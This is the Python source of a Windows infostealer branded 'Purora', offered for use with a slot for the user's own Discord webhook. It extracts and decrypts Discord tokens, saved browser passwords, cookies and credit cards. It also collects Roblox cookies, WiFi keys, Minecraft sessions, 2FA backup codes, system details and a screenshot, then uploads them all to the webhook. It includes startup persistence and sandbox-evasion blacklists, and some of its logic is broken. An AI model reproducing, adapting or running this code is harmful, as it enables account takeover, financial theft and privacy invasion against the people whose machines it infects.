# https://github.com/Purora/ FOR MORE SOFTWARE
# TO USER GRABBER JUST CHANGE STRING CALLED "YOUR WEBHOOK HERE"
import base64
import json
import os
import platform
import random
import re
import sqlite3
import subprocess
import threading
import uuid
import ctypes
import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from shutil import copy2
from sys import argv
from tempfile import gettempdir, mkdtemp
from zipfile import ZIP_DEFLATED, ZipFile

# ///////////////////////////////////////////////////ADD HRERE YOUR WEBHOOK /////////////////////////////
__WEBHOOK_HERE__ = "YOUR WEBHOOK HERE"
# ///////////////////////////////////////////////////ADD HRERE YOUR WEBHOOK /////////////////////////////


__PING__ = "%ping_enabled%"
__PINGTYPE__ = "%ping_type%"
__ERROR__ = "%_error_enabled%"
__STARTUP__ = "%_startup_enabled%"
__DEFENDER__ = "%_defender_enabled%"

def main(webhook: str):
    webhook = SyncWebhook.from_url(webhook, session=requests.Session())

    threads = [Browsers, Wifi, Minecraft, BackupCodes]
    configcheck(threads)

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    zipup()

    _file = None
    _file = File(f'{localappdata}\\{os.getlogin()}.zip')

    content = ""
    if __PING__:
        if __PINGTYPE__ == "everyone":
            content += "@everyone"
        elif __PINGTYPE__ == "here":
            content += "@here"

    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096", username="Purora")

    PcInfo()
    Discord()


def program(webhook: str):
    Debug()

    procs = [main]

    for proc in procs:
        proc(webhook)

def try_extract(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            pass
    return wrapper


def configcheck(list):
    if not __ERROR__:
        list.remove(fakeerror)
    if not __STARTUP__:
        list.remove(startup)
    if not __DEFENDER__:
        list.remove(disable_defender)

def startup():
    startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    if os.path.exists(startup_path + argv[0]):
        os.remove(startup_path + argv[0])
        copy2(argv[0], startup_path)
    else:
        copy2(argv[0], startup_path)

def create_temp(_dir: str or os.PathLike = gettempdir()):
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x")
    return path


class PcInfo:
    def __init__(self):
        self.get_inf(__WEBHOOK_HERE__)

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Purora", color=10038562)
        
        computer_os = platform.platform()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)

        embed.add_field(
            name="System Info",
            value=f''' **PC Username:** `{username}`\n **PC Name:** `{hostname}`\n **OS:** `{computer_os}`\n\n **IP:** `{ip}`\n **MAC:** `{mac}`\n **HWID:** `{hwid}`\n\n **CPU:** `{cpu.Name}`\n **GPU:** `{gpu.Name}`\n **RAM:** `{ram}GB`''',
            inline=False)
        embed.set_footer(text="https://github.com/Purora (FOR MORE SOFTWARE)")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096")

        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096", username="Purora")


@try_extract
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__WEBHOOK_HERE__)
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())

        for token in self.tokens:
            if token in self.tokens_sent:
                pass

            val_codes = []
            val = ""
            nitro = "none"

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                       'Content-Type': 'application/json',
                       'Authorization': token}

            r = requests.get(self.baseurl, headers=headers).json()
            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)

            username = r['username'] + '#' + r['discriminator']
            discord_id = r['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
            phone = r['phone']
            email = r['email']

            try:
                if r['mfa_enabled']:
                    mfa = "true"
                else:
                    mfa = "none"
            except Exception:
                mfa = "none"

            try:
                if r['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif r['premium_type'] == 2:
                    nitro = 'Nitro'
                elif r['premium_type'] == 3:
                    nitro = 'Nitro Basic'
            except BaseException:
                nitro = nitro

            if b == []:
                methods = "none"
            else:
                methods = ""
                try:
                    for method in b:
                        if method['type'] == 1:
                            methods += "CREDIT CARD"
                        elif method['type'] == 2:
                            methods += "PAYPAL ACCOUNT"
                        else:
                            methods += "FOUND UNKNOWN METHOND"
                except TypeError:
                    methods += "FOUND UNKNOWN METHOND"

            val += f' **Discord ID:** `{discord_id}` \n **Email:** `{email}`\n **Phone:** `{phone}`\n\n **2FA:** `{mfa}`\n **Nitro:** `{nitro}`\n **Billing:** `{methods}`\n\n **Token:** `{token}`\n'

            if "code" in g.text:
                codes = json.loads(g.text)
                try:
                    for code in codes:
                        val_codes.append((code['code'], code['promotion']['outbound_title']))
                except TypeError:
                    pass

            if val_codes == []:
                val += f'\n**No Gift Cards Found**\n'
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3:
                        break
                    val += f'\n `{t}:`\n**{c}**\n[Click to copy!]({c})\n'
            else:
                for c, t in val_codes:
                    val += f'\n `{t}:`\n**{c}**\n[Click to copy!]({c})\n'

            embed = Embed(title=username, color=10038562)
            embed.add_field(name=".                                                    Discord Info                                .", value=val + "\u200b", inline=False)
            embed.set_thumbnail(url=avatar)

            webhook.send(
                embed=embed,
                avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096",
                username="Purora")
            self.tokens_sent += token

        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        image.save(tempfolder + "\\image.png")

        embed2 = Embed(title="Victim point of view", color=10038562)
        file = File(tempfolder + "\\image.png", filename="image.png")
        embed2.set_image(url="attachment://image.png")

        webhook.send(
            embed=embed2,
            file=file,
            username="Purora")
        os.close(image)


@try_extract
class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        os.makedirs(os.path.join(tempfolder, "Browser"), exist_ok=True)
        os.makedirs(os.path.join(tempfolder, "Roblox"), exist_ok=True)

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass

        self.roblox_cookies()

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return

        loginvault = create_temp()
        copy2(path, loginvault)
        conn = sqlite3.connect(loginvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url != "":
                    f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
        cursor.close()
        conn.close()
        os.remove(loginvault)

    def cookies(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        historyvault = create_temp()
        copy2(path, historyvault)
        conn = sqlite3.connect(historyvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser History.txt"), 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
        cursor.close()
        conn.close()
        os.remove(historyvault)

    def credit_cards(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        cardvault = create_temp()
        copy2(path, cardvault)
        conn = sqlite3.connect(cardvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Creditcards.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                if name_on_card and card_number_encrypted != "":
                    f.write(
                        f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.decrypt_password(card_number_encrypted, self.masterkey)}\n")
        f.close()
        cursor.close()
        conn.close()
        os.remove(cardvault)

    def roblox_cookies(self):
        with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github}\n\n")
            with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
                for line in f2:
                    if ".ROBLOSECURITY" in line:
                        f.write(line.split(".ROBLOSECURITY")[1].strip() + "\n")
            f2.close()
        f.close()


@try_extract
class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github} | Wifi Networks & Passwords\n\n")

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
            else:
                with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
                    f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                f.close()

        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()


@try_extract
class Minecraft:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
        self.usercache_path = "\\.minecraft\\usercache.json"
        self.error_message = "No minecraft accounts or access tokens :("

        os.makedirs(os.path.join(tempfolder, "Minecraft"), exist_ok=True)
        self.session_info()
        self.user_cache()

    def session_info(self):
        with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github} | Minecraft Session Info\n\n")
            if os.path.exists(self.roaming + self.accounts_path):
                with open(self.roaming + self.accounts_path, "r") as g:
                    self.session = json.load(g)
                    f.write(json.dumps(self.session, indent=4))
            else:
                f.write(self.error_message)
        f.close()

    def user_cache(self):
        with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github}\n\n")
            if os.path.exists(self.roaming + self.usercache_path):
                with open(self.roaming + self.usercache_path, "r") as g:
                    self.user = json.load(g)
                    f.write(json.dumps(self.user, indent=4))
            else:
                f.write(self.error_message)
        f.close()


@try_extract
class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'

        os.makedirs(os.path.join(tempfolder, "Discord"), exist_ok=True)
        self.get_codes()

    def get_codes(self):
        with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
            f.write(f"{github}\n\n")
            if os.path.exists(self.path + self.code_path):
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            else:
                f.write("No discord backup codes found")
        f.close()


def zipup():
    global localappdata
    localappdata = os.getenv('LOCALAPPDATA')

    _zipfile = os.path.join(localappdata, f'{os.getlogin()}.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    abs_src = os.path.abspath(tempfolder)
    for dirname, _, files in os.walk(tempfolder):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            zipped_file.write(absname, arcname)
    zipped_file.close()

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update,
                                             '--processStart',
                                             executable],
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
class Debug:
    global tempfolder
    tempfolder = mkdtemp()

    def __init__(self):

        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = [
            'WDAccount', 'Abby', 'hmarc', 'patex', 'RDh', 'kEecfMwgj', 'Frank', '5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8M', 'wA',
            'U1', 'test', 'Reg']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeer", argv[0]]

        self.check_process()
        if self.get_network():
            debugging = False
        if self.get_system():
            debugging = False

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def get_network(self) -> bool:
        global ip, mac, github

        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        github = "https://github.com/Purora (FOR MORE SOFTWARE)"

        if ip in self.blackListedIPS:
            return False
        if mac in self.blackListedMacs:
            return False

    def get_system(self) -> bool:
        global hwid, username, hostname

        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        if hwid in self.blackListedHWIDS:
            return False
        if username in self.blackListedUsers:
            return False
        if hostname in self.blackListedPCNames:
            return False

    def self_destruct(self) -> None:
        program(__WEBHOOK_HERE__)



if __name__ == '__main__' and os.name == "nt":
    program(__WEBHOOK_HERE__)
# DISCORD APP INJECTION
